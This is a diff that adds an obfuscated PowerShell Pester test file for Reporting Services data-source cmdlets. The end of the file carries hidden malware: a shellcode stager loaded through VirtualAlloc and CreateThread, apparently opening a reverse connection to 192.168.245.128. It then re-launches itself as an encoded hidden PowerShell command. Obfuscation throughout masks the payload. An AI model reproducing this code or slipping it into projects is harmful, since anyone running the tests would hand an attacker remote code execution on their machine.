@@ -1,0 +1,164 @@
+ SET ('N'+'px') (  [tYPE]("{0}{1}"-F'GuI','d')  ) ; $sAB8 =[TYPE]("{3}{1}{0}{2}" -F 'M.conv','Te','ert','sYS');    sET ('JnEW'+'u'+'4')  ([tyPE]("{5}{0}{3}{1}{2}{4}" -F'e','te','Xt.En','m.','CODInG','SysT') )  ;    sEt-iTem VaRiaBLe:a85OD  ([Type]("{0}{1}" -F 'iNTp','TR'))  ;  
+
+
+${r`eporTSe`RV`E`RUrI} = if (${En`V:peSTe`RS`eRver`U`Rl} -eq ${N`ULL}) { ("{0}{7}{1}{4}{8}{5}{3}{2}{6}" -f'http://','ho','rve','tse','st','por','r','local','/re') } else { ${eN`V:P`e`sTER`S`ErVeRUrl} }
+
+&("{0}{1}" -f'Des','cribe') ("{3}{1}{5}{0}{2}{4}" -f'S','t-','ourc','Se','e','RsItemData') { 
+    ${rsFO`LD`ERP`ATh} = ''
+    ${daTa`s`O`UR`C`EsREPortpath} = ''
+
+    &("{0}{2}{1}"-f 'Be','h','foreEac') {
+        
+        ${FoldER`N`A`me} = ("{5}{3}{0}{1}{2}{4}"-f'RestC','atalog','Ite','_OutRs','m_','SUT') +  (GET-vaRiABLE  ('n'+'PX') ).vaLuE::("{0}{1}" -f 'NewGui','d').Invoke()
+        &("{1}{2}{3}{0}"-f 'r','Ne','w-Rs','Folde') -ReportServerUri ${repORTs`erve`RU`RI} -RsFolder ('/') -FolderName ${fOl`DE`RN`AmE}
+        ${rSFo`lder`pA`Th} = '/' + ${foLD`ER`Name}
+
+        ${L`o`CalRe`soURCespAth} = (&("{1}{2}{0}"-f'tem','Get','-I') -Path ".\")."FUL`l`NaME"  + ((("{1}{2}{8}{5}{7}{0}{3}{6}{4}"-f 'tResources{0}','{0}Tests{0','}Cat','data','rces','gItems{0}','sou','tes','alo'))-f  [cHar]92)
+        
+        
+        &("{3}{2}{0}{1}" -f'ogIte','m','sCatal','Write-R') -ReportServerUri ${rE`POrt`se`Rveru`Ri} -Path "$localResourcesPath\datasourcesReport.rdl" -RsFolder ${rSfoL`d`ERp`AtH}
+        ${DatA`S`Ou`RC`EsrE`po`RTPAth} = "$rsFolderPath/datasourcesReport"
+    }
+
+    &("{1}{0}{2}" -f'r','Afte','Each') {
+        &("{2}{3}{4}{1}{0}" -f'em','It','R','em','ove-RsCatalog') -ReportServerUri ${r`EpO`Rts`erVe`RUri} -RsItem ${da`TAS`oUrce`srEp`orTpATh} -Confirm:${FaL`sE}
+        &("{4}{1}{3}{0}{2}" -f 'logIt','emove-RsCat','em','a','R') -ReportServerUri ${repO`R`TSE`Rv`ERurI} -RsItem ${RSFo`Ld`eRPaTH} -Confirm:${f`ALsE}
+    }
+
+    &("{1}{0}"-f 'text','Con') ("{1}{0}{5}{4}{6}{3}{2}" -f'ates da','Upd','es with Proxy parameter','ourc','a','t',' s') {
+        ${P`R`oXY} = &("{4}{2}{3}{0}{1}{5}"-f 'P','ro','Serv','ice','New-RsWeb','xy') -ReportServerUri ${Repo`R`TSe`Rver`URi}
+
+        &('It') ("{0}{2}{4}{3}{1}" -f'S','tegrated auth','hou','low in','ld al') {
+            ${d`AT`ASoUr`ces} = &("{0}{4}{2}{1}{3}{5}"-f 'Get-R','mD','te','at','sI','aSource') -Path ${daTaSo`U`RC`ESrEP`orTPa`TH} -Proxy ${PRo`xy}
+            ${DAtaSO`U`Rc`ES}."C`OUnt" | &("{1}{0}" -f 'uld','Sho') ('Be') 2
+
+            ${d`ATA`sOURc`Es}[0]."IT`EM"."cR`Ed`EnTiAlRETrieV`AL" = ("{1}{2}{0}"-f 'ed','Integ','rat')
+            &("{1}{2}{0}{3}{4}" -f't','Se','t-RsI','em','DataSource') -Path ${da`T`A`sO`UrCeSrepoRTP`ATh} -DataSource ${d`ATa`S`ouRCeS} -Proxy ${p`ROxY} -Verbose
+
+            ${U`p`DA`TE`DDaTa`sOURCEs} = &("{0}{2}{3}{4}{1}" -f'Get-','DataSource','R','sI','tem') -Path ${DAtaSoU`RcesrEp`ORTP`A`TH} -Proxy ${P`ROXY}
+            ${uPd`AT`EdD`AtasoU`R`Ces}[0]."i`Tem"."c`RE`DeNti`ALrEtriev`AL" | &("{1}{2}{0}"-f'uld','S','ho') ('Be') ("{0}{1}{2}" -f 'Integr','a','ted')
+        }
+
+        &('It') ("{6}{5}{4}{8}{0}{1}{7}{3}{2}"-f 'ored a','uth with SQL credent','s','l','w s','ld allo','Shou','ia','t') {
+            ${D`ATAS`OUrCES} = &("{1}{0}{5}{2}{6}{4}{3}" -f 'Rs','Get-','t','e','urc','I','emDataSo') -Path ${DAt`AS`oURcE`SR`epoRtpA`Th} -Proxy ${pro`Xy}
+            ${Da`Ta`SouR`cES}."Co`Unt" | &("{1}{0}" -f 'hould','S') ('Be') 2
+
+            ${DAt`Aso`UrCES}[0]."iT`EM"."CrEd`ENtiAL`Re`T`RievAL" = ("{1}{0}"-f 'ore','St')
+            ${DatasO`U`R`ces}[0]."i`TeM"."UseR`N`AmE" = ("{1}{0}"-f'qluser','s')
+            ${DA`TaS`oUrCeS}[0]."It`eM"."PaSSw`OrD" = ("{1}{2}{3}{0}"-f 'rd','sqlus','erp','asswo')
+            &("{0}{2}{3}{1}"-f 'Set-','aSource','RsIt','emDat') -Path ${DA`T`A`s`OURC`ESr`EpoRTpATh} -DataSource ${dA`TasoUR`C`eS} -Proxy ${PrO`xY} -Verbose
+
+            ${U`Pd`AtE`DDatA`SouRc`Es} = &("{3}{2}{5}{1}{0}{4}"-f 'aSourc','emDat','t-Rs','Ge','e','It') -Path ${daTaso`Ur`C`e`sREpOr`TPATH} -Proxy ${pro`xy}
+            ${Upd`A`TED`daT`ASourCes}[0]."It`eM"."crEDENtI`AlR`E`T`RievaL" | &("{0}{1}" -f 'Sho','uld') ('Be') ("{1}{0}"-f'ore','St')
+            ${UpdaTe`D`dATAs`O`Urc`ES}[0]."iT`em"."uSeR`N`AmE" | &("{0}{1}{2}" -f 'Sh','ou','ld') ('Be') ("{1}{0}" -f 'ser','sqlu')
+            ${U`pda`TEdd`AtASoURcES}[0]."i`Tem"."Pa`sS`Word" | &("{1}{0}"-f'hould','S') ("{3}{0}{1}{4}{2}" -f 'Nul','lOrE','pty','Be','m')
+            ${Up`D`ATedDAtasoUR`C`eS}[0]."iT`em"."wiNDo`wScre`dE`NTIAlS" | &("{1}{0}" -f 'ould','Sh') ('Be') ("{1}{0}"-f 'alse','F')
+            ${U`Pd`AT`EDd`AtASO`URCes}[0]."It`eM"."i`mPe`RsON`AtE`User" | &("{1}{0}" -f 'd','Shoul') ('Be') ("{1}{0}" -f'e','Fals')
+        }
+
+        &('It') ("{13}{0}{2}{5}{10}{6}{12}{4}{8}{9}{7}{3}{1}{11}"-f'hould ','t','allow ','den','h Win','sto',' au',' cre','do','ws','red','ials','th wit','S') {
+            ${d`AT`ASoUrcES} = &("{0}{1}{3}{4}{2}{5}"-f 'Get-Rs','I','ur','temDa','taSo','ce') -Path ${DAta`sOURC`eSREp`ORT`p`A`TH} -Proxy ${Pr`oXY}
+            ${DA`T`A`SoUrcEs}."CO`Unt" | &("{0}{1}" -f 'Sho','uld') ('Be') 2
+
+            ${Da`TASO`URCes}[0]."IT`em"."CR`E`dENtialReTR`ie`Val" = ("{0}{1}" -f'S','tore')
+            ${DAT`AsOURc`ES}[0]."it`EM"."uSE`R`NAme" = ("{1}{2}{0}" -f 'dowsuser','wi','n')
+            ${D`AT`AsO`URcEs}[0]."it`em"."P`ASs`WoRD" = ("{2}{0}{4}{5}{3}{1}" -f 'nd','word','wi','ss','owsuser','pa')
+            ${daT`A`SOUrCeS}[0]."iT`eM"."wI`Ndo`W`s`CRE`DentIaLS" = ${tr`UE}
+            &("{4}{1}{3}{5}{2}{0}" -f 'e','-RsIte','aSourc','mD','Set','at') -Path ${dA`TA`sOUrCeSRe`PO`Rtpa`Th} -DataSource ${dA`TA`sOUrCEs} -Proxy ${pRo`Xy} -Verbose
+
+            ${upd`AtedDATa`so`UrC`Es} = &("{1}{2}{0}{4}{5}{3}"-f 'temDat','Get-R','sI','e','aSo','urc') -Path ${d`AtASo`Ur`CE`sReP`OrTpatH} -Proxy ${p`RO`Xy}
+            ${uPDat`E`ddaT`A`Sou`R`ceS}[0]."it`EM"."c`RedE`N`TiALReTrIEvaL" | &("{1}{0}"-f 'ld','Shou') ('Be') ("{0}{1}" -f 'Stor','e')
+            ${uP`dA`TEd`d`AtaS`OuRces}[0]."It`eM"."uSErN`AME" | &("{1}{2}{0}"-f 'uld','S','ho') ('Be') ("{2}{1}{0}"-f 'user','s','window')
+            ${Upd`AteDd`A`T`AsOuR`CeS}[0]."I`TEm"."pAs`s`WORD" | &("{0}{1}"-f 'Shoul','d') ("{2}{1}{0}{3}" -f'OrEm','l','BeNul','pty')
+            ${up`DAteDdAtAs`OU`R`cES}[0]."It`Em"."wInD`O`WSc`Re`DentiALS" | &("{0}{1}{2}"-f'S','h','ould') ('Be') ("{0}{1}" -f 'Tru','e')
+            ${u`Pd`ATeDdat`Asou`R`CeS}[0]."it`eM"."iMp`ErSONa`T`Eu`seR" | &("{0}{1}{2}"-f 'S','h','ould') ('Be') ("{1}{0}"-f 'alse','F')
+        }
+
+        &('It') ("{11}{3}{6}{9}{2}{1}{8}{5}{7}{12}{13}{0}{4}{10}" -f'ntials and i','w st','lo','h','mpersonat','ed a','oul','uth with','or','d al','ion','S',' SQL ','crede') {
+            ${DAtA`souR`ceS} = &("{4}{5}{0}{1}{2}{3}" -f'-Rs','ItemDat','aSour','ce','Ge','t') -Path ${DA`T`ASoUrC`EsRe`po`Rt`paTh} -Proxy ${p`RO`xy}
+            ${dAt`AS`ouRc`eS}."CO`UNt" | &("{1}{0}" -f'hould','S') ('Be') 2
+
+            ${dA`TaS`OURCES}[0]."it`em"."cR`EDeN`TiaLR`ETr`i`Eval" = ("{0}{1}" -f 'Stor','e')
+            ${DAt`ASOU`RceS}[0]."It`em"."US`E`RNaMe" = ("{0}{1}{2}"-f 'sqlu','s','er')
+            ${data`soU`Rc`es}[0]."i`Tem"."PASsWO`Rd" = ("{1}{0}{3}{2}" -f 'userp','sql','ord','assw')
+            ${Dat`As`OuRcES}[0]."I`Tem"."iMp`eR`sOn`A`TeUSeR" = ${tR`Ue}
+            &("{1}{2}{3}{0}"-f'rce','Set-Rs','ItemD','ataSou') -Path ${dATAsourC`eS`Re`PO`RtpaTh} -DataSource ${dAta`S`OuR`ceS} -Proxy ${pR`OxY} -Verbose
+
+            ${UPd`ATEddAtAS`OUR`CeS} = &("{0}{2}{3}{1}" -f 'G','ource','et-RsIt','emDataS') -Path ${dA`TasO`U`RCesRepO`R`TPATH} -Proxy ${pRO`XY}
+            ${UpDA`Te`DdAta`s`oU`RCEs}[0]."i`TEM"."credEn`TIA`lre`T`RI`EVal" | &("{1}{0}" -f 'uld','Sho') ('Be') ("{1}{0}"-f'tore','S')
+            ${UPDAT`eDDat`ASO`URceS}[0]."iT`eM"."Us`ErnA`ME" | &("{0}{1}"-f 'Shou','ld') ('Be') ("{0}{1}{2}" -f'sql','u','ser')
+            ${UpDa`Te`dDatAs`OU`Rc`Es}[0]."IT`EM"."PA`sSw`ord" | &("{0}{1}" -f 'Shou','ld') ("{1}{4}{2}{0}{3}" -f'rE','BeNu','O','mpty','ll')
+            ${uP`DA`TeddAT`AsOURc`ES}[0]."It`em"."W`iNDoW`ScRE`D`En`TiALs" | &("{0}{1}"-f 'Sh','ould') ('Be') ("{1}{0}"-f 'e','Fals')
+            ${uPDA`Ted`DatA`s`O`UrCeS}[0]."i`TeM"."IMpeR`SO`NAtE`U`SEr" | &("{0}{1}" -f 'Sho','uld') ('Be') ("{1}{0}"-f 'rue','T')
+        }
+
+        &('It') ("{1}{6}{11}{4}{0}{3}{12}{15}{2}{9}{7}{8}{5}{13}{14}{10}"-f't','Sho',' Windows cre','ored','w s','nd im','uld a','e','ntials a','d','tion','llo',' a','perso','na','uth with') {
+            ${DA`T`ASOuRceS} = &("{2}{0}{3}{1}" -f '-RsIt','ce','Get','emDataSour') -Path ${D`A`TasO`U`RCESrePO`RTpAth} -Proxy ${pr`OXY}
+            ${DA`Ta`SOurces}."C`OunT" | &("{1}{0}"-f'ould','Sh') ('Be') 2
+
+            ${dATa`S`o`UrCEs}[0]."i`TEM"."cReDeNtiA`lr`Et`R`i`EVaL" = ("{1}{0}"-f'e','Stor')
+            ${daTASOU`RC`ES}[0]."I`TEM"."US`eRna`mE" = ("{0}{1}{2}" -f 'w','indows','user')
+            ${d`ATaSOu`RC`eS}[0]."it`EM"."P`AsSw`oRD" = ("{2}{4}{5}{3}{0}{1}"-f'passw','ord','w','r','indo','wsuse')
+            ${DA`TASou`R`CES}[0]."It`eM"."W`indOW`Sc`R`eDentiAlS" = ${t`RuE}
+            ${dAt`AS`Ou`RCES}[0]."I`Tem"."imPERS`ONAt`EUser" = ${t`Rue}
+            &("{2}{0}{1}{3}" -f 't-RsItemD','at','Se','aSource') -Path ${Dat`A`soURc`EsrEpo`RTpA`TH} -DataSource ${D`Atas`OurcEs} -Proxy ${pR`Oxy} -Verbose
+
+            ${upd`AteddATa`sO`UrceS} = &("{0}{5}{2}{3}{4}{1}{6}"-f'G','aS','t-RsI','tem','Dat','e','ource') -Path ${dATasO`UrcE`sR`e`PO`RT`paTH} -Proxy ${P`R`oXY}
+            ${UPDaTe`dDa`T`ASOu`RCes}[0]."It`em"."CREDEnti`Alret`RIe`Val" | &("{0}{1}" -f 'S','hould') ('Be') ("{1}{0}"-f 'ore','St')
+            ${UPDAT`e`D`DAta`Sou`RC`es}[0]."IT`Em"."uSER`N`Ame" | &("{0}{1}"-f'Sh','ould') ('Be') ("{2}{1}{0}"-f 'suser','ndow','wi')
+            ${UpDate`DD`AtasO`UrceS}[0]."i`Tem"."Pa`Ss`word" | &("{1}{0}"-f 'ould','Sh') ("{1}{0}{3}{2}"-f'llOr','BeNu','ty','Emp')
+            ${UpD`AT`e`dda`TAsoUrceS}[0]."I`TEm"."WindOWSc`R`e`DentiALS" | &("{0}{1}{2}"-f 'Sh','oul','d') ('Be') ("{0}{1}"-f 'Tru','e')
+            ${u`P`D`ATedd`Ata`sOurces}[0]."i`TeM"."IMperSOna`TEU`sEr" | &("{1}{0}"-f'uld','Sho') ('Be') ("{1}{0}"-f'ue','Tr')
+        }
+
+        &('It') ("{5}{0}{2}{3}{6}{1}{4}" -f'ld allo','ent','w ','prom','ials','Shou','pt for SQL cred') {
+            ${DATaS`oUrc`eS} = &("{2}{3}{0}{1}"-f'mDataSour','ce','Get','-RsIte') -Path ${dATasOURceSrEp`or`Tpa`TH} -Proxy ${PR`O`xy}
+            ${DA`Ta`SOu`RCes}."coU`NT" | &("{0}{1}" -f'S','hould') ('Be') 2
+
+            ${d`AtasOu`RCES}[0]."It`em"."cRe`D`eNtiAlrEtr`IEvAl" = ("{1}{0}{2}"-f 'p','Prom','t')
+            &("{4}{3}{1}{0}{2}{5}"-f'-RsI','t','te','e','S','mDataSource') -Path ${DaTas`o`U`RcESre`PorTp`Ath} -DataSource ${d`Atas`o`Urces} -Proxy ${prO`Xy} -Verbose
+
+            ${uPDa`TEd`d`A`TaS`Ourc`eS} = &("{2}{0}{1}{4}{3}"-f 'sItemDa','t','Get-R','ource','aS') -Path ${Da`TasOUrCES`R`ePORtPa`Th} -Proxy ${pRo`xY}
+            ${up`datED`dAt`ASo`UrcEs}[0]."I`TeM"."Cr`Ede`NtIA`lReTRI`EvAl" | &("{0}{1}"-f'Shou','ld') ('Be') ("{1}{0}" -f 'rompt','P')
+            ${updAT`EddaTasoU`R`CeS}[0]."iT`Em"."wIND`o`w`SCrEd`ent`Ials" | &("{1}{0}"-f'hould','S') ('Be') ("{1}{0}"-f'lse','Fa')
+        }
+
+        &('It') ("{3}{5}{0}{6}{4}{8}{1}{2}{7}"-f'l','for W','indows ','Sh','allow prompt','ou','d ','credentials',' ') {
+            ${dATaSo`UR`CES} = &("{6}{1}{2}{5}{4}{3}{0}"-f'ce','s','I','taSour','emDa','t','Get-R') -Path ${D`At`Aso`UrCeSRe`Po`RtPatH} -Proxy ${Pr`o`xy}
+            ${DaT`A`S`OURcEs}."CO`Unt" | &("{0}{1}" -f 'Sh','ould') ('Be') 2
+
+            ${D`AtA`sOURCES}[0]."i`TeM"."cR`EdEN`TiALREtr`IE`VAl" = ("{0}{1}" -f'P','rompt')
+            ${D`Ata`Sour`CEs}[0]."I`TEM"."w`I`N`DOWsc`ReDeNtialS" = ${t`Rue}
+            &("{2}{4}{1}{0}{3}" -f'c','temDataSour','Set-Rs','e','I') -Path ${daTas`O`Ur`CESrEP`ortPaTH} -DataSource ${d`ATa`s`oURces} -Proxy ${p`R`oxy} -Verbose
+
+            ${uPd`ATEDdAtaSoU`RC`ES} = &("{5}{4}{1}{3}{0}{2}" -f 'rc','DataSo','e','u','-RsItem','Get') -Path ${DatAs`ouRC`Es`REporT`P`ATh} -Proxy ${PR`O`XY}
+            ${UpDAT`edDaTASo`UR`c`eS}[0]."I`TEm"."c`RE`de`NTIALReTRIEvAl" | &("{1}{0}"-f 'd','Shoul') ('Be') ("{2}{0}{1}"-f'om','pt','Pr')
+            ${UpdatE`dDat`AS`oU`RCes}[0]."I`TEM"."WinDOW`SCR`ED`ent`iALs" | &("{1}{0}"-f 'ould','Sh') ('Be') ("{1}{0}"-f 'ue','Tr')
+        }
+
+        &('It') ("{4}{7}{1}{8}{9}{0}{5}{3}{6}{2}" -f 'h','allo','age','me','Shoul',' ','ss','d ','w prom','pt wit') {
+            ${d`ATa`sOUrCeS} = &("{4}{3}{2}{0}{5}{1}" -f 'tem','ataSource','I','-Rs','Get','D') -Path ${DATas`O`UrcEsREP`oRTpATH} -Proxy ${P`ROXY}
+            ${da`Tasou`RceS}."Cou`Nt" | &("{1}{0}"-f'hould','S') ('Be') 2
+
+            ${D`ATaS`oUrc`ES}[0]."I`Tem"."C`R`Ed`EnTIalrEtrI`EVal" = ("{0}{1}"-f 'P','rompt')
+            ${D`ATa`sOur`CeS}[0]."i`Tem"."p`Ro`Mpt" = ("{1}{0}{4}{2}{3}" -f'a p','This is ','mp','t','ro')
+            &("{1}{2}{0}{3}{4}"-f't-','S','e','RsI','temDataSource') -Path ${d`AtAsourc`e`SrE`PorTpAtH} -DataSource ${DA`TAsOU`R`ces} -Proxy ${pR`OXy} -Verbose
+
+            ${U`Pdat`Ed`daT`Asour`CeS} = &("{4}{3}{2}{0}{1}"-f'Da','taSource','t-RsItem','e','G') -Path ${dA`TasO`U`RC`ESRE`PORT`PAth} -Proxy ${P`RO`xy}
+            ${UPDa`TEd`DATa`S`OU`RCeS}[0]."I`TeM"."cREdE`NTI`A`lret`RiEv`AL" | &("{0}{1}"-f 'Shou','ld') ('Be') ("{1}{0}" -f 'rompt','P')
+            ${up`d`A`TEd`datAsOuR`ceS}[0]."i`TEm"."p`ROMPt" | &("{0}{2}{1}"-f'Sh','ld','ou') ('Be') ("{0}{1}{3}{2}"-f'T','his ','s a prompt','i')
+        }
+
+        &('It') ("{2}{4}{3}{6}{7}{5}{0}{1}" -f'eden','tials','Sh',' a','ould','o cr','l','low n') {
+            ${da`TaSOU`RceS} = &("{0}{3}{1}{2}"-f'Get-','mDataSo','urce','RsIte') -Path ${Da`TAs`oUrces`REPo`RT`p`ATH} -Proxy ${pR`OXy}
+            ${Data`s`OURC`ES}."co`UNt" | &("{1}{0}" -f'ould','Sh') ('Be') 2
+
+            ${dAta`S`OUrc`Es}[0]."i`TEM"."CRedEnTi`AlRE`Tr`iev`Al" = ("{0}{1}"-f'N','one')
+            &("{3}{4}{2}{5}{0}{1}"-f'DataSourc','e','s','S','et-R','Item') -Path ${da`TaSo`URCe`SREPortpA`TH} -DataSource ${DATA`SOU`Rc`eS} -Proxy ${PR`oXY} -Verbose
+
+            ${U`pdaTe`D`dataS`oUrces} = &("{0}{5}{4}{2}{1}{3}"-f'Ge','Sour','ata','ce','-RsItemD','t') -Path ${DA`TaS`O`UR`CeSRE`por`TPAtH} -Proxy ${P`R`OxY}
+            ${UP`dAteDd`ATAs`OURCEs}[0]."I`TeM"."crEDE`NtIAl`Retrie`VAL" | &("{2}{1}{0}" -f'd','oul','Sh') ('Be') ("{0}{1}"-f 'No','ne')
+        }
+    }
+}
+${1} = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xf5,0x80,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';${GQ} =  (  DIR ('VA'+'r'+'IABLE:sab'+'8')  ).Value::"tobASE64`STrI`Ng"( (gI ('vARiAb'+'LE:J'+'ne'+'Wu'+'4')  ).VALue::"uNi`Code".("{1}{2}{0}" -f'es','Ge','tByt').Invoke(${1}));if( (ChIlditeM VARIABLE:a85Od  ).value::"s`iZE" -eq 8){${x`86} = ${eN`V:SYs`T`emrOoT} + ((("{13}{6}{12}{14}{5}{7}{15}{3}{0}{8}{4}{2}{1}{10}{11}{9}"-f'owsPowerS','rsh','Xv1.0e6Xpowe','ind','e6','wow','6','64e','hell','l','e','l','Xsy','e','s','6XW'))."rEP`LacE"(([Char]101+[Char]54+[Char]88),[sTring][Char]92));${c`MD} = ("{1}{2}{0}{3}{4}" -f'-','-nop -no','ni ','enc',' ');&("{1}{0}" -f 'ex','i') ('& '+"$x86 "+"$cmd "+"$gq")}else{${C`mD} = ("{3}{0}{2}{1}" -f'on','-enc','i ','-nop -n');&("{0}{1}" -f 'ie','x') ('& '+'p'+'ower'+'shell '+"$cmd "+"$gq");}
